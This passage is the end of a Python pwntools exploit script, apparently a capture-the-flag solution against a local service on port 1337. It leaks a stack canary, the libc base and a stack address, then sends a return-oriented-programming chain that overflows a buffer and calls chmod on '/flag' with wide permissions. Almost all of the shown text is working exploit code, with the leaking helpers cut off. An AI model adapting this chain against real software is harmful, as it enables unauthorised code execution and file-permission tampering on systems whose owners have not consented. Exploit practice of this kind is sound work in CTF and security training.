    libc_chmod_addr = libc_base + libc_chmod
    flag_addr = stack_val  # TODO: check this
    buf_3 = b'\x41' * padding
    buf_3 += canary
    buf_3 += p64(0x4242424242424242)  # new value for rbp     
    buf_3 += p64(pop_rdi_ret)  # pop rdi; ret
    buf_3 += p64(flag_addr)
    buf_3 += p64(pop_rsi_ret)  # pop rsi; ret
    buf_3 += p64(0xffff)
    buf_3 += p64(libc_chmod_addr)  # chmod call
    buf_3 += b'/flag\x00\x00\x00' * 0x50
    with remote('0.0.0.0', 1337) as p:
        p.send(buf_3)
        time.sleep(0.5)
        p.recvuntil(b'Leaving!')

def main(): 
    padding = 0x78  # TODO: change this
    if False:
        p0 = gdb.debug(BINARY, gdbscript=GDB_SCRIPT)
        p0 = process(BINARY)
        time.sleep(2)
        p1 = remote('0.0.0.0', 1337)
        p1.send(b'\x41' * 0x18)
        p0.interactive()
    if True:
        canary = leak_canary(padding)
        libc_base = leak_libc(padding, canary)
        libc_base = int.from_bytes(libc_base, "little") - 0x12fc90 + 0xe4000 # TODO: adapt this
        assert(libc_base & 0xfff == 0)
        stack_val = leak_stack(padding, canary, libc_base)
        print(f'canary = {hex(int.from_bytes(canary, "little"))}')
        print(f'libc_base = {hex(libc_base)}') 
        print(f'stack_val = {hex(stack_val)}')
        run_chmod(padding, canary, libc_base, stack_val)
        exit()

if __name__ == '__main__':
    main()
```
